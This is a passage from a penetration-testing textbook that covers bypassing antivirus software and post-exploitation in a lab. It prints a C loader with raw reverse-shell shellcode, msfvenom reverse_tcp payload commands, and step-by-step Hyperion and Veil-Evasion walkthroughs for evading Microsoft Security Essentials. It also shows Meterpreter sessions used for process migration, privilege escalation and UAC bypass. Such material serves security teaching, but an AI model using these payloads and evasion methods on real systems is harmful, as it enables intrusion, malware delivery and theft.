But if we just cat out data from /dev/urandom, we‚Äôll get a lot of unprintable characters. To get the proper data for a character array, we‚Äôll use the tr
Linux utility to translate the /dev/urandom data to printable characters. Use 
tr -dc A-Z-a-z-0-9, and then pipe the commands into the head command to 
output only the first 512 characters from /dev/urandom, as shown here. 
root@kali:~# cat /dev/urandom | tr -dc A-Z-a-z-0-9 | head -c512 
s0UULfhmiQGCUMqUd4e51CZKrvsyIcLy3EyVhfIVSecs8xV-JwHYlDgfiCD1UEmZZ2Eb6G0no4qjUI
IsSgneqT23nCfbh3keRfuHEBPWlow5zX0fg3TKASYE4adL
--snip--
268 Chapter 12
Now drop the data from /dev/urandom into the random variable in the 
C file. The finished file is shown in Listing 12-7. (Of course, your randomness and encoded payload will differ.) Be sure to surround the string with 
quotes and use a semicolon (;) at the end.
#include <stdio.h>
unsigned char random[]= "s0UULfhmiQGCUMqUd4e51CZKrvsyIcLy3EyVhfIVSecs8xV-JwHYlDgfiCD1UEmZZ2Eb6G
0no4qjUIIsSgneqT23nCfbh3keRfuHEBPWlow5zX0fg3TKASYE4adLqB-3X7MCSL9SuqlChqT6zQkoZNvi9YEWq4ec8 
-ajdsJW7s-yZOKHQXMTY0iuawscx57e7Xds15GA6rGObF4R6oILRwCwJnEa-4vrtCMYnZiBytqtrrHkTeNohU4gXcVIem 
-lgM-BgMREf24-rcW4zTi-Zkutp7U4djgWNi7k7ULkikDIKK-AQXDp2W3Pug02hGMdP6sxfR0xZZMQFwEF-apQwMlog4Trf
5RTHFtrQP8yismYtKby15f9oTmjauKxTQoJzJD96sA-7PMAGswqRjCQ3htuWTSCPleODITY3Xyb1oPD5wt-G1oWvavrpewe
LERRN5ZJiPEpEPRTI62OB9mIsxex3omyj10bEha43vkerbN0CpTyernsK1csdLmHRyca";
unsigned char shellcode[]= "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
"\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68"
"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
"\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50"
"\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a"
"\x05\x68\x0a\x00\x01\x09\x68\x02\x00\x09\x29\x89\xe6\x6a\x10"
"\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e"
"\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56"
"\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10"
"\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a"
"\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6"
"\x85\xf6\x75\xec\xc3";
int main(void)
{
 ((void (*)())shellcode)();
}
Listing 12-7: Finished custom C file
Now we need to compile the C program. We can‚Äôt use the built-in 
GCC program because it would compile our program to run on Linux 
systems, and we want to run it on a 32-bit Windows system. Instead, we‚Äôll 
use the Mingw32 cross compiler from the Kali Linux repositories , which 
we installed in Chapter 1. If you haven‚Äôt already installed it, install it with 
apt-get install mingw32, and then compile your custom C file with i586-mingw32msvc-gcc. (Other than the program name, the syntax for using the cross 
compiler is the same as for Linux‚Äôs built-in GCC, discussed in Chapter 3.)
Bypassing Antivirus Applications 269
root@kali:~# i586-mingw32msvc-gcc -o custommeterpreter.exe custommeterpreter.c
Now upload the resulting executable to VirusTotal. As of this writing, 
18 antivirus products detected the malicious file. That‚Äôs an improvement, 
but Microsoft Security Essentials is still catching our file. 
We still need to work a little harder to get a malicious executable onto 
our Windows 7 system. (You could have better success with this technique 
with another cross compiler from another repository.) 
Encrypting Executables with Hyperion 
Another way to obfuscate our payload is to encrypt it. One executable 
encrypter is Hyperion, which uses Advanced Execution Standard (AES) 
encryption, a current industry standard. After encrypting the executable, 
Hyperion throws away the encryption keys. When the executable runs, 
it brute-forces the encryption key to decrypt itself back to the original 
executable. 
If you have any background in cryptography, this process should raise 
a lot of red flags. AES is currently considered a secure encryption standard. 
If the executable doesn‚Äôt have access to the encryption key, it should not 
be able to brute-force the key in any reasonable amount of time, certainly 
not fast enough for our program to run in the time window of our pentest. 
What‚Äôs going on?
As it turns out, Hyperion greatly reduces the possible keyspace for the 
encryption key, which means that binaries encrypted with it shouldn‚Äôt be 
considered cryptographically secure. However, because our goal and the 
goal of the Hyperion authors is to obfuscate the code to bypass antivirus 
detection, the fact that the key can be brute-forced is not a problem. 
Let‚Äôs start by using Hyperion to encrypt at simple Meterpreter executable 
with no additional antivirus avoidance techniques, as shown in Listing 12-8. 
(We installed Hyperion in Chapter 1 on page 21).
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -f exe > 
meterpreter.exe
root@kali:~# cd Hyperion-1.0/
root@kali:~/Hyperion-1.0# wine ../hyperion ../meterpreter.exe bypassavhyperion.exeu
Opening ../bypassav.exe
Copied file to memory: 0x117178
--snip--
Executing fasm.exe
flat assembler version 1.69.31
5 passes, 0.4 seconds, 92672 bytes.
Listing 12-8: Running Hyperion
270 Chapter 12
Hyperion was written to run on Windows systems, but we can run it 
on Kali Linux with the Wine program, as you can see in Listing 12-8. Be 
sure to change into the Hyperion directory created when you unzipped the 
source before running hyperion.exe with Wine. 
Hyperion takes two arguments: the name of the file to encrypt and 
the name of the encrypted output file. Run Hyperion to encrypt the 
simple Meterpreter executable as shown at u. The resulting file is in the 
Hyperion 1.0 directory, so upload it to VirusTotal from there.
Using just a Meterpreter executable generated with Msfvenom (with 
no encoding, custom templates, or anything else) and encrypting it with 
Hyperion resulted in 27 antivirus programs in VirusTotal detecting the 
malicious behavior. That‚Äôs not our lowest detection rate yet, but we have 
finally achieved our goal. As shown in Figure 12-8, Microsoft Security 
Essentials did not detect any malicious activity!
Figure 12-8: Microsoft Security Essentials does not detect malware.
Sure enough, we can download and run the Hyperion-encrypted 
executable on the Windows 7 system with antivirus protection and get a 
Meterpreter session. We haven‚Äôt achieved a 0 percent detection rate‚Äîthe 
holy grail for antivirus bypass researchers‚Äîbut we have been able to meet 
our pentest goals. 
N ote To lower our detection rate even more, try combining Hyperion encryption with other
techniques from this section. For example, using Hyperion with a custom template 
dropped my detection number down to 14. 
Evading Antivirus with Veil-Evasion 
Even though we have successfully reached our goal of bypassing Microsoft 
Security Essentials on Windows 7, the antivirus landscape changes rapidly, 
so it is worthwhile to keep abreast of the latest tools and techniques. VeilEvasion is a Python framework that automates creating antivirus-evading 
payloads, giving users the choice of multiple techniques. We covered installing Veil-Evasion on Kali Linux in Chapter 1 on page 21; refer back if you 
need a refresher.
N ote As updates are made to Veil-Evasion, your version may be different from what is
shown here.
Bypassing Antivirus Applications 271
Python Shellcode Injection with Windows API
Previously we looked at using a custom C template to compile and execute 
shellcode. We can do something similar with Python‚Äôs Ctypes library, which 
gives us access to Windows API function calls and can create C-compatible 
data types. We can use Ctypes to access the Windows API VirtualAlloc, which 
creates a new executable memory region for the shellcode and locks the 
memory region in physical memory, to avoid a page fault as shellcode is copied in and executed. RtlMoveMemory is used to copy the shellcode bytes into 
the memory region created by VirtualAlloc. The CreateThread API creates a 
new thread to run the shellcode, and finally, WaitForSingleObject waits until 
the created thread is finished and our shellcode has finished running. 
These steps collectively are referred to as the VirtualAlloc injection 
method. This method, of course, would give us a Python script rather than 
a Windows executable, but you can use multiple tools to convert a Python 
script into a stand-alone executable. 
Creating Encrypted Python-Generated Executables with Veil-Evasion 
One of the methods implemented in Veil-Evasion uses the Python injection technique described earlier. To provide further antivirus protection, 
Veil-Evasion can use encryption. For our example, we will use Python 
VirtualAlloc injection combined with AES encryption, as we did in the 
Hyperion example earlier in this chapter. 
To start Veil-Evasion, change directories to Veil-Evasion-master and run 
./Veil-Evasion.py. You should be presented with a menu-based prompt similar 
to those we saw in SET in the previous chapter, as shown in Listing 12-9. 
root@kali:~/Veil-Evasion-master# ./Veil-Evasion.py 
========================================================================
 Veil-Evasion | [Version]: 2.6.0
========================================================================
 [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
========================================================================
 Main Menu
 28 payloads loaded
 Available commands:
 use use a specific payload
 info information on a specific payload
 list list available payloads
 update update Veil to the latest version
 clean clean out payload folders
 checkvt check payload hashes vs. VirusTotal
 exit exit Veil
Listing 12-9: Running Veil 
272 Chapter 12
To see all the available payloads in Veil-Evasion, enter list at the 
prompt, as shown in Listing 12-10. 
[>] Please enter a command: list
Available payloads:
 1) auxiliary/coldwar_wrapper
 2) auxiliary/pyinstaller_wrapper
--snip--
 22) python/meterpreter/rev_tcp
 u23) python/shellcode_inject/aes_encrypt
 24) python/shellcode_inject/arc_encrypt
 25) python/shellcode_inject/base64_substitution
 26) python/shellcode_inject/des_encrypt
 27) python/shellcode_inject/flat
 28) python/shellcode_inject/letter_substitution
Listing 12-10: Veil-Evasion payloads 
As of this writing, there are 28 ways to create executables implemented in 
Veil-Evasion. For this example, choose option 23 u to use the VirtualAlloc 
injection method and encrypt it with AES encryption. Once you choose a 
method, Veil-Evasion will prompt you to change the method options from the 
default, if desired, as shown in Listing 12-11. 
[>] Please enter a command: 23
Payload: python/shellcode_inject/aes_encrypt loaded
 Required Options:
 Name Current Value Description
 ---- ------------- -----------
 ucompile_to_exe Y Compile to an executable
 expire_paylo X Optional: Payloads expire after "X" days
 vinject_method Virtual Virtual, Void, Heap
 use_pyherion N Use the pyherion encrypter
 Available commands:
 set set a specific option value
 info show information about the payload
 generate generate payload
 back go to the main menu
 exit exit Veil
Listing 12-11: Using Python VirtualAlloc in Veil-Evasion
Bypassing Antivirus Applications 273
By default, this payload will compile the Python script into an executable u using VirtualAlloc() as the injection method v. These options are 
correct for our example, so enter generate at the prompt. You are then 
prompted for details about the shellcode, as shown in Listing 12-12. 
[?] Use msfvenom or supply custom shellcode?
 1 - msfvenom (default)
 2 - Custom
 [>] Please enter the number of your choice: 1
 [*] Press [enter] for windows/meterpreter/reverse_tcp
 [*] Press [tab] to list available payloads
 [>] Please enter metasploit payload: 
 [>] Enter value for 'LHOST', [tab] for local IP: 192.168.20.9
 [>] Enter value for 'LPORT': 2345
 [>] Enter extra msfvenom options in OPTION=value syntax: 
 [*] Generating shellcode...
 [*] Press [enter] for 'payload'
 [>] Please enter the base name for output files: meterpreterveil
 [?] How would you like to create your payload executable?
 1 - Pyinstaller (default)
 2 - Py2Exe
 [>] Please enter the number of your choice: 1
--snip--
 [*] Executable written to: /root/veil-output/compiled/meterpreterveil.exe
 Language: python
 Payload: AESEncrypted
 Shellcode: windows/meterpreter/reverse_tcp
 Options: LHOST=192.168.20.9 LPORT=2345
 Required Options: compile_to_exe=Y inject_method=virtual use_pyherion=N
 Payload File: /root/veil-output/source/meterpreterveil.py
 Handler File: /root/veil-output/handlers/meterpreterveil_handler.rc
 [*] Your payload files have been generated, don't get caught!
 [!] And don't submit samples to any online scanner! ;)
Listing 12-12: Generating the executable in Veil-Evasion 
Veil-Evasion prompts you to select either Msfvenom to generate 
the shellcode or to provide custom shellcode. For our purposes, choose 
Msfvenom. The default payload is windows/meterpreter/reverse_tcp, so press 
enter to select it. You should be prompted for the usual options, LHOST and 
274 Chapter 12
LPORT, and for a filename for the generated executable. Finally, Veil-Evasion 
offers two Python to executable methods. Choose the default, Pyinstaller, 
to have Veil-Evasion generate the malicious executable and save it to the 
veil-output/compiled directory. 
As of this writing, the resulting executable sails right past Microsoft 
Security Essentials on our Windows 7 box. Veil-Evasion notes that you 
shouldn‚Äôt upload the resulting executable to online scanners, so at the 
author‚Äôs request we‚Äôll forgo checking this example with VirusTotal. 
However, we can install other antivirus solutions besides Microsoft 
Security Essentials to see if the executable is flagged.
N ote If you find the Veil-Evasion executables aren‚Äôt working, you might need to update
Metasploit with Msfupdate. Since Veil-Evasion is not currently in the Kali Linux 
repos, the latest version you pull down when you set up may not match up with how 
Msfvenom works in the default Kali 1.0.6 install. Of course, if you update Metasploit 
with Msfupdate, other exercises in this book may change, as Metasploit‚Äôs functionality changes frequently. Therefore, you may want to save this exercise for a second pass 
through the book or use a second Kali Linux image if you don‚Äôt want the update to 
affect later exercises in the book. 
Hiding in Plain Sigh
Perhaps the best way to avoid antivirus programs is to avoid traditional payloads altogether. If you are familiar with coding for Windows, you can use 
Windows APIs to mimic the functionality of a payload. There is, of course, no 
rule that legitimate applications cannot open a TCP connection to another 
system and send data‚Äîessentially what our windows/meterpreter/reverse_tcp
payload is doing. 
You may find that instead of generating the payload with Msfvenom and 
attempting to hide it with the methods covered in this chapter, you get even 
better results just writing a C program that performs the payload functionality you want. You can even invest in a code-signing certificate to sign your 
binary executable, to make it look even more legitimate. 
note Turn Real-time protection in Microsoft Security Essentials back off before moving on 
to post exploitation.
Summar
We‚Äôve looked at only a few techniques for bypassing antivirus detection in 
this chapter. The topic of bypassing antivirus solutions could take up an 
entire book, and by the time it was published, the book would already be 
wildly out of date. Pentesters and researchers are constantly coming up with 
new techniques to sneak past antivirus detection, and antivirus vendors are 
always adding new signatures and heuristics to catch them. 
Bypassing Antivirus Applications 275
We looked at ways to use Metasploit to encode and embed payloads 
in legitimate executables. When we found that these techniques weren‚Äôt 
enough to evade Microsoft Security Essentials, we turned to techniques 
beyond Metasploit. We built a custom executable template and found that 
we were able to improve our results by combining techniques. 
We were finally able to reach our goal of bypassing Microsoft Security 
Essentials using Hyperion. Though we never reached a 0 percent detection 
rate, we were able to bypass Microsoft Security Essentials as well as several 
other top antivirus solutions. We also looked at another tool, Veil-Evasion, 
which uses VirtualAlloc injection combined with encryption for even better 
evasion. 
Having looked at a lot of ways to get onto systems, even ones without 
readily apparent vulnerabilities, we‚Äôll now turn our attention to what we can 
do once we penetrate a system, as we enter the post-exploitation stage of 
pentesting. 

13
Post  x ploita t i o 
We‚Äôve gained access to our target systems, so our penetration test is over, right? We can tell our client that 
we got a shell on their systems. 
But so what? Why would the client care?
In the post-exploitation phase, we will look at information gathering 
on the exploited systems, privilege escalation, and moving from system to 
system. Perhaps we‚Äôll find that we can access sensitive data stored on the 
exploited system or that we have network access to additional systems that 
we can use to gain further access to company data. Maybe the exploited 
system is part of a domain, and we can use it to access other systems on the 
domain. These are just a few of the potential avenues open to us in post 
exploitation. 
Post exploitation is arguably the most important way to get a clear picture of a client‚Äôs security posture. For example, in Chapter 9, I mentioned a 
pentest in which I used access to a decommissioned Windows 2000 domain 
controller to gain complete administrative control over a domain. If I hadn‚Äôt 
used post-exploitation techniques, I might have instead concluded that the 
Windows 2000 system stored no sensitive information and that it wasn‚Äôt 
278 Chapter 13
connected to other systems in a domain. My pentest would not have been 
nearly as successful, and my client wouldn‚Äôt have gotten as good of a picture 
of their vulnerabilities, especially when it came to password policies. 
This chapter will cover the basics of post exploitation. As you move 
beyond this book and increase your skills as a pentester, you should spend 
a good deal of time on post exploitation. Solid post-exploitation skills differentiate good pentesters from the truly great. 
Now let‚Äôs look at some of our post-exploitation options in Metasploit. 
Meterprete
We discussed Meterpreter, Metasploit‚Äôs custom payload, in Chapter 8. Now 
let‚Äôs dig deeper and look at some of Meterpreter‚Äôs functionality. 
We‚Äôll begin post exploitation by opening a Meterpreter session on each 
of our target systems. As you can see in Listing 13-1, I have a session on the 
Windows XP target from the MS08-067 exploit. On the Windows 7 target, 
I used a trojan executable like those we used in the previous chapter. On 
the Linux target, I used the TikiWiki PHP vulnerability we exploited in 
Chapter 8. You can also log in to the Linux target via SSH using either the 
password for georgia we cracked in Chapter 9 (password) or the SSH public 
key we added in Chapter 8 using the open NFS share. 
msf > sessions -l
Active sessions
===============
 Id Type Information Connection
 -- ---- ----------- ----------
 1 meterpreter x86/win32 NT AUTHORITY\SYSTEM @ BOOKXP 192.168.20.9:4444 -> 
 192.168.20.10:1104 
 (192.168.20.10)
 2 meterpreter x86/win32 Book-Win7\Georgia Weidman @ Book-Win7 192.168.20.9:2345 -> 
 192.168.20.12:49264 
 (192.168.20.12)
 3 meterpreter php/php www-data (33) @ ubuntu 192.168.20.9:4444 -> 
 192.168.20.11:48308 
 (192.168.20.11)
Listing 13-1: Open Metasploit sessions on our targets 
Start by interacting with your Windows XP session as shown here. 
msf post(enum_logged_on_users) > sessions -i 1
We‚Äôve already seen a couple of Meterpreter commands throughout the 
book. Namely, in Chapter 9, we used hashdump to get direct access to local 
password hashes in on ‚ÄúOffline Password Attacks‚Äù on page 203. To see a 
list of available Meterpreter commands, enter help in the Meterpreter console. For more details about a specific command, enter command -h.
Post Exploitation 279
Using the upload Command
Perhaps nothing is quite so annoying on a pentest as finding yourself on a 
Windows machine without access to utilities such as wget and curl to pull 
down files from a web server. In Chapter 8, we saw a way to bypass this 
problem with TFTP, but Meterpreter easily solves the problem for us. With 
a simple command, help upload, we can upload files to the target, as shown 
in Listing 13-2. 
meterpreter > help upload
Usage: upload [options] src1 src2 src3 ... destination
Uploads local files and directories to the remote machine.
OPTIONS:
 -h Help banner.
 -r Upload recursively.
Listing 13-2: Meterpreter help command
This help information tells us that we can use upload to copy files from 
our Kali system to the Windows XP target. 
For example, here‚Äôs how to upload Netcat for Windows: 
meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\
[*] uploading : /usr/share/windows-binaries/nc.exe -> C:\
[*] uploaded : /usr/share/windows-binaries/nc.exe -> C:\\nc.exe
N ote Remember to escape the backslash characters in the path with a second backslash. Also
remember that if you upload anything to a target during a pentest or otherwise change 
the target system, record your changes so you can undo them before the engagement 
is over. The last thing you want to do is leave an environment more vulnerable than 
when you found it. 
getuid
Another useful Meterpreter command is getuid. This command will tell you 
the name of the System user running Meterpreter. Typically, Meterpreter runs 
with the privileges of the exploited process or user. 
For example, when we exploit an SMB server with the MS08-067 exploit, 
we‚Äôre running on the target with the privileges of the SMB server, namely 
the Windows System account, as shown here. 
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
On the Windows 7 target, we social-engineered the user into running a 
trojaned program that connected back to Metasploit, so Meterpreter is running as the user Georgia Weidman. 
280 Chapter 13
Other Meterpreter Commands
Before moving on, take some time to work with additional Meterpreter 
commands. You‚Äôll find many useful commands for local information gathering, remote control, and even spying on local users, such as keylogging 
and turning on a webcam from a Meterpreter session. 
Meterpreter Script
In addition to Meterpreter commands, you can also run Meterpreter scripts 
from a Meterpreter console. The scripts currently available can be found 
in Kali at /usr/share/metasploit-framework/scripts/meterpreter. These scripts are 
written in Ruby, and you can write your own and submit them for inclusion 
in the framework. To use a Meterpreter script, enter run <script name>. Use 
the -h flag to see help information for a script. 
When exploiting Internet Explorer in Chapter 10, we used the 
AutoRunScript option to automatically run the migrate script to spawn a new 
process and migrate into it before the browser crashed. We can run this script 
directly inside Meterpreter as well. For example, entering run migrate -h, as 
shown in Listing 13-3, gives us information on the migrate Meterpreter 
script. 
meterpreter > run migrate -h
OPTIONS:
 -f Launch a process and migrate into the new process
 -h Help menu.
 -k Kill original process.
 -n <opt> Migrate into the first process with this executable name 
(explorer.exe)
 -p <opt> PID to migrate to.
Listing 13-3: Migrate script help information 
Because we‚Äôre not racing to beat a session before it closes, we have a 
few different options for which process to migrate to. We can migrate to a 
process by name using the -n option. For example, to migrate to the first 
instance of explorer.exe that Meterpreter encounters in the process list, we 
can use -n explorer.exe. 
You can also migrate to a process by using its process ID (PID) with the 
-p option. Use Meterpreter‚Äôs ps command to see a list of running processes, 
as shown in Listing 13-4. 
Post Exploitation 281
meterpreter > ps
Process List
============
 PID PPID Name Arch Session User Path
 --- ---- ---- ---- ------- ---- ----
 0 0 [System Process] 4294967295 
 4 0 System x86 0 NT AUTHORITY\SYSTEM 
--snip--
 1144 1712 explorer.exe x86 0 BOOKXP\georgia C:\WINDOWS\Explorer.EXE
--snip--
 1204 1100 wscntfy.exe x86 0 BOOKXP\georgia 
Listing 13-4: Running process list
Explorer.exe is a solid choice. Choose PID 1144 for explorer.exe, and run the 
Meterpreter migrate script as shown in Listing 13-5. 
meterpreter > run migrate -p 1144
[*] Migrating from 1100 to 1144...
[*] Migration completed successfully.
meterpreter > getuid
Server username: BOOKXP\georgia
Listing 13-5: Running the migrate script
Meterpreter successfully migrates into the explorer.exe process. Now if 
the SMB server happens to become unstable or die, our Meterpreter session 
is safe. 
If you ran the getuid command again, you would see that we are no longer running as the System user but as user georgia. This makes sense because 
this process belongs to the logged-in user georgia. By moving into this process, we‚Äôve effectively dropped our privileges down to user georgia. 
Let‚Äôs stay logged in as user georgia on the XP target and look at some 
ways to elevate our privileges to System on Windows targets and root on the 
Linux target through local privilege-escalation attacks. 
Metasploit Post-Exploitation Modu
So far we‚Äôve used Metasploit modules for information gathering, vulnerability identification, and exploitation. It should come as no surprise that the 
framework has a plethora of useful modules for the post-exploitation phase 
as well. Metasploit‚Äôs post directory contains modules for local information 
gathering, remote control, privilege escalation, and so on, which span multiple platforms. 
282 Chapter 13
For example, consider the module post/windows/gather/enum_logged_
on_users. As shown in Listing 13-6, this module will show us which users 
are currently logged on to the target system. Put your session in the background (with ctrl-Z or background) to return to the main Msfconsole 
prompt.
msf > use post/windows/gather/enum_logged_on_users 
msf post(enum_logged_on_users) > show options
Module options (post/windows/gather/enum_logged_on_users):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 CURRENT true yes Enumerate currently logged on users
 RECENT true yes Enumerate Recently logged on users
uSESSION yes The session to run this module on.
msf post(enum_logged_on_users) > set SESSION 1
SESSION => 1
msf post(enum_logged_on_users) > exploit
[*] Running against session 1
Current Logged Users
====================
 SID User
 --- ----
 S-1-5-21-299502267-308236825-682003330-1003 BOOKXP\georgia
[*] Results saved in: /root/.msf4/loot/20140324121217_default_192.168.20.10_host.users.activ
_791806.txt v
Recently Logged Users
=====================
 SID Profile Path
 --- ------------
 S-1-5-18 %systemroot%\system32\config\systemprofile
 S-1-5-19 %SystemDrive%\Documents and Settings\LocalService
 S-1-5-20 %SystemDrive%\Documents and Settings\NetworkService
 S-1-5-21-299502267-308236825-682003330-1003 %SystemDrive%\Documents and Settings\georgia
Listing 13-6: Running a Metasploit post module 
We use post modules as we do all Metasploit modules: We set the relevant options, and then enter exploit to run the module. However, in the 
case of post-exploitation modules, instead of setting an RHOST or SRVHOST, we 
need to tell Metasploit the Session ID we want to run the post-exploitation 
module against u. We then run the module against Session 1, the Windows 
XP target. 
Post Exploitation 283
The module returns data telling us the user georgia is currently 
logged in. Metasploit automatically saves the output to a file /root/.msf4/
loot/20140324121217_default_192.168.20.10_host.users.activ_791806.txt v. 
Railgu
Railgun is an extension for Meterpreter that allows direct access to Windows 
APIs. It can be used inside post-exploitation modules for Meterpreter as well 
as the Ruby shell (irb) in a Meterpreter session. For example, we can check 
if the session is running as an administrative user by directly accessing the 
IsUserAnAdmin function of the shell32 Windows DLL, as shown here. Be sure to 
bring a session to the foreground with sessions -i <session id> first.
meterpreter > irb
[*] Starting IRB shell
[*] The 'client' variable holds the meterpreter client
>> client.railgun.shell32.IsUserAnAdmin
=> {"GetLastError"=>0, "Error Message"=>"The operation completed successfully.", "return"=>true}
First, we drop into a Ruby shell with the command irb. Note that the 
client variable holds the Meterpreter client. Next we enter client.railgun 
.shell32.IsUserAnAdmin to tell the Ruby interpreter to use Railgun on the current Meterpreter session and access the IsUserAdmin function of shell32.dll. (For 
additional Railgun examples, check out Metasploit post modules such as 
windows/gather/reverse_lookup.rb and windows/manage/download_exec.rb, which 
also leverage this functionality.) Enter exit to drop out of the Ruby interpreter 
and return to Meterpreter.
Local Privilege Escalatio
In the following sections, we‚Äôll explore examples of local privilege escalation, 
which involves running exploits to gain additional control of the system 
after exploitation. 
Just like network software and client-side software, privileged local 
processes can be subject to exploitable security issues. Some of your attacks 
may not result in gaining the privileges you would like. Gaining command 
execution through a website, compromising a user account without administrative rights, or exploiting a listening service with limited privileges can 
all lead to system access, but you may find yourself still working as a limited 
user. To get the privileges we want, we will need to exploit further issues. 
getsystem on Windows 
Meterpreter‚Äôs getsystem command automates trying a series of known local 
privilege-escalation exploits against the target. The command‚Äôs options are 
shown in Listing 13-7. 
284 Chapter 13
meterpreter > getsystem -h
Usage: getsystem [options]
Attempt to elevate your privilege to that of local system.
OPTIONS:
 -h Help Banner.
 -t <opt> The technique to use. (Default to '0').
 0 : All techniques available
 1 : Service - Named Pipe Impersonation (In Memory/Admin)
 2 : Service - Named Pipe Impersonation (Dropper/Admin)
 3 : Service - Token Duplication (In Memory/Admin)
Listing 13-7: getsystem help 
As shown here, running getsystem with no arguments will run a series 
of local exploits until one succeeds or all known exploits are exhausted. To 
run a particular exploit, use the -t option followed by the exploit number. 
Here we run getsystem on our Windows XP target with no arguments. 
meterpreter > getsystem
...got system (via technique 1).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
As you can see, Meterpreter gained system privileges with the first 
exploit it tried. With one command, we are able to elevate our privileges 
from georgia to System. 
Local Escalation Module for Windows 
Local exploit modules in Metasploit allow you to run an exploit on an 
open session to gain additional access. The local privilege-escalation 
module exploit/windows/local/ms11_080_afdjoinleaf in Listing 13-8 exploits 
a (now-patched) flaw in the Afdjoinleaf function of the afd.sys Windows 
driver. Like post-exploitation modules, use the SESSION option to denote 
which open session the exploit should be run against. We‚Äôll run the module 
against our Windows XP session. Unlike post modules, local exploits are 
exploits, so we‚Äôll need to set a payload. If it succeeds, our exploit will open a 
new session with System privileges. In your Windows XP Meterpreter session, run the command rev2self to drop back down to the user georgia
before using this alternative privilege-escalation technique.
msf post(enum_logged_on_users) > use exploit/windows/local/ms11_080_afdjoinleaf
msf exploit(ms11_080_afdjoinleaf) > show options
Module options (exploit/windows/local/ms11_080_afdjoinleaf):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 SESSION yes The session to run this module on.
Post Exploitation 285
--snip--
msf exploit(ms11_080_afdjoinleaf) > set SESSION 1
SESSION => 1
msf exploit(ms11_080_afdjoinleaf) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(ms11_080_afdjoinleaf) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf exploit(ms11_080_afdjoinleaf) > exploit
[*] Started reverse handler on 192.168.20.9:4444 
[*] Running against Windows XP SP2 / SP3
--snip--
[*] Writing 290 bytes at address 0x00f70000
[*] Sending stage (751104 bytes) to 192.168.20.10
[*] Restoring the original token...
[*] Meterpreter session 4 opened (192.168.20.9:4444 -> 192.168.20.10:1108) at 
2015-08-14 01:59:46 -0400
meterpreter > 
Listing 13-8: Metasploit local exploit 
After you enter exploit, Metasploit runs the exploit in our Windows XP 
session. If it succeeds, you should receive another Meterpreter session. If 
you run getuid on this new session, you should see that you‚Äôve once again 
obtained System privileges. 
N ote Remember, to succeed, local privilege-escalation attacks rely on a flaw such as a
missing patch or security misconfiguration. A fully updated and locked-down system 
would not be vulnerable to the MS11-08 exploit because a vendor patch was released 
in 2011. 
Bypassing UAC on Windows
Now let‚Äôs see how to escalate our privileges on our more secure Windows 7 
target, which has additional security features including user account control 
(UAC). Applications running on Windows Vista and higher are limited to 
using regular user privileges. If an application needs to use administrative privileges, an administrative user has to approve the elevation. (You‚Äôve 
probably seen the warning notice from UAC when an application wants to 
make changes.) 
Because we gained this session by having user Georgia Weidman run 
a malicious binary, the Meterpreter session currently has the privileges 
of Georgia Weidman. Try using getsystem against this target, as shown in 
Listing 13-9.
msf exploit(ms11_080_afdjoinleaf) > sessions -i 2
[*] Starting interaction with 2...
meterpreter > getuid
286 Chapter 13
Server username: Book-Win7\Georgia Weidman
meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: Access is denied.
Listing 13-9: getsystem fails on Windows 7
As you can see, running getsystem against this target fails and gives an 
error message. Perhaps this system is fully patched and hardened to the 
point where none of the exploitation techniques in getsystem will work. 
But as it turns out, our Windows 7 target has not been patched since 
installation; UAC is stopping getsystem from working properly. 
As with any computer security control, researchers have developed multiple techniques to bypass the UAC control. One such technique is included 
in Metasploit in the local exploit windows/local/bypassuac. Background 
the session and run this exploit on your Windows 7 session, as shown in 
Listing 13-10. Use the exploit module, set the SESSION option, and so on. 
msf exploit(ms11_080_afdjoinleaf) > use exploit/windows/local/bypassuac 
msf exploit(bypassuac) > show options
Module options (exploit/windows/local/bypassuac):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 SESSION yes The session to run this module 
msf exploit(bypassuac) > set SESSION 2
SESSION => 2
msf exploit(bypassuac) > exploit
[*] Started reverse handler on 192.168.20.9:4444 
[*] UAC is Enabled, checking level...
--snip--
[*] Uploaded the agent to the filesystem....
[*] Sending stage (751104 bytes) to 192.168.20.12
[*] Meterpreter session 5 opened (192.168.20.9:4444 -> 192.168.20.12:49265) at 
2015-08-14 02:17:05 -0400
